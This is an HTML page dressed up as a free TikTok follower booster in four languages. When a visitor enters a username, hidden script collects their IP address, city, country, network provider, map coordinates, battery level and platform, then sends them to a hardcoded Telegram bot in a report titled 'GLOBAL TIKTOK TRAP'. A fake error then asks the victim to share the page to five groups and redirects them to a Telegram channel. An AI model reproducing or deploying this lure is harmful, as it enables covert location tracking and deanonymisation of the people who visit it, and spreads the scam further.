<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Global Booster</title>
    <style>
        body { background: #010101; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; direction: ltr; }
        .lang-bar { background: #1a1a1a; padding: 10px; display: flex; justify-content: center; gap: 10px; border-bottom: 1px solid #333; }
        .lang-bar span { font-size: 12px; cursor: pointer; color: #00f2ea; border: 1px solid #333; padding: 2px 8px; border-radius: 5px; }
        .header { background: #000; padding: 30px; border-bottom: 2px solid #ff0050; }
        .header img { width: 50px; }
        .container { max-width: 400px; margin: 20px auto; padding: 25px; background: #111; border-radius: 20px; text-align: center; box-shadow: 0 0 20px rgba(255,0,80,0.2); }
        h2 { font-size: 20px; margin-bottom: 20px; }
        input, select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
        .btn { width: 100%; padding: 16px; background: #ff0050; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
        #loading { display: none; margin-top: 20px; }
        .loader-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-top: 10px; }
        .fill { width: 0%; height: 100%; background: #00f2ea; transition: 0.5s; }
    </style>
</head>
<body>

    <div class="lang-bar">
        <span onclick="setLang('en')">English</span>
        <span onclick="setLang('ps')">پښتو</span>
        <span onclick="setLang('dr')">دری</span>
        <span onclick="setLang('ar')">العربية</span>
    </div>

    <div class="header">
        <h1 id="title">TikTok Booster</h1>
    </div>

    <div class="container">
        <h2 id="h2">Get Free Followers</h2>
        <input type="text" id="username" placeholder="Username (e.g. @user)">
        <select id="amount">
            <option value="5000">5,000 Followers</option>
            <option value="10000">10,000 Followers</option>
            <option value="50000">50,000 Followers</option>
        </select>
        <button class="btn" id="btn" onclick="process()">Start Injection</button>

        <div id="loading">
            <p id="status" style="font-size: 13px; color: #00f2ea;">Connecting...</p>
            <div class="loader-bar"><div class="fill" id="fill"></div></div>
        </div>
    </div>

    <script>
        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
        const chatId = "7461145170";

        const texts = {
            en: { title: "TikTok Booster", h2: "Get Free Followers", user: "Username", btn: "Start Injection", load: "Connecting...", err: "Verification Required!" },
            ps: { title: "ټیک ټاک فالوورز", h2: "وړیا فالوورز ترلاسه کړئ", user: "آیډي ولیکئ", btn: "فالوورز زیات کړئ", load: "سیسټم سره وصل کیږي...", err: "تاییدي اړینه ده!" },
            dr: { title: "تیک تاک فالوور", h2: "فالوور رایگان بگیرید", user: "نام کاربری", btn: "افزایش فالوور", load: "در حال اتصال...", err: "تایید هویت لازم است!" },
            ar: { title: "متابعین تیك توك", h2: "احصل على متابعین مجاناً", user: "اسم المستخدم", btn: "زیادة المتابعین", load: "جاري الاتصال...", err: "مطلوب التحقق!" }
        };

        function setLang(l) {
            document.getElementById('title').innerText = texts[l].title;
            document.getElementById('h2').innerText = texts[l].h2;
            document.getElementById('username').placeholder = texts[l].user;
            document.getElementById('btn').innerText = texts[l].btn;
            document.body.style.direction = (l === 'en') ? 'ltr' : 'rtl';
        }

        async function process() {
            const user = document.getElementById('username').value;
            if(!user) return;

            document.getElementById('loading').style.display = 'block';
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                let battery = "N/A";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + "%";
                }

                const report = `
🌍 **GLOBAL TIKTOK TRAP**
------------------------------
👤 **User:** \`${user}\`
🔋 **Battery:** ${battery}
🌐 **IP:** \`${d.ip}\`
📍 **Location:** ${d.city}, ${d.country_name}
🏢 **Network:** ${d.org}
📱 **Platform:** ${navigator.platform}
------------------------------
📍 **Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
------------------------------
                `;

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
                });

            } catch (e) {}

            let w = 0;
            let i = setInterval(() => {
                w += 5;
                document.getElementById('fill').style.width = w + "%";
                if(w >= 100) {
                    clearInterval(i);
                    alert("System Error: Final verification required. Please share to 5 groups.");
                    window.location.href = "https://t.me/TOPAK1V";
                }
            }, 100);
        }
    </script>
</body>
</html>
